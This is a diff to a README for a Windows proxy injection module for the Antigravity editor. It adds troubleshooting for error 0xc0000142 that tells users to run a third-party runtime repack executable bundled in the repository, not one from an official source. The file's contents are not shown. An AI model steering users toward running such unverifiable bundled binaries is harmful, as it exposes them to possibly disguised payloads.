@@ -36,6 +36,32 @@
 
 ---
 
+## ⚠️ Environment Requirements
+
+> Before using this tool, ensure the required runtime libraries are installed, otherwise the target application may fail to start.
+
+### Common Issue: Error 0xc0000142
+
+If you encounter **error code 0xc0000142** when launching the program (as shown below), it's usually caused by missing Windows runtime libraries.
+
+<p align="center">
+  <img src="img/error/win_error_0xc0000142.png" alt="0xc0000142 Error Screenshot" width="400"/>
+</p>
+
+### Solution
+
+Please install the **Microsoft Visual C++ Runtime Pack**, which is included in this repository:
+
+📦 **Download Path**: [`microsoft\微软常用运行库合集-2025.exe`](microsoft/微软常用运行库合集-2025.exe)
+
+**Installation Steps:**
+1. Navigate to the `microsoft` folder in this repository
+2. Run `微软常用运行库合集-2025.exe`
+3. Follow the installation wizard
+4. Restart the target application
+
+
+---
 ## 📖 Introduction
 
 **Antigravity-Proxy** is a Windows proxy injection module built specifically for the **Antigravity editor**.
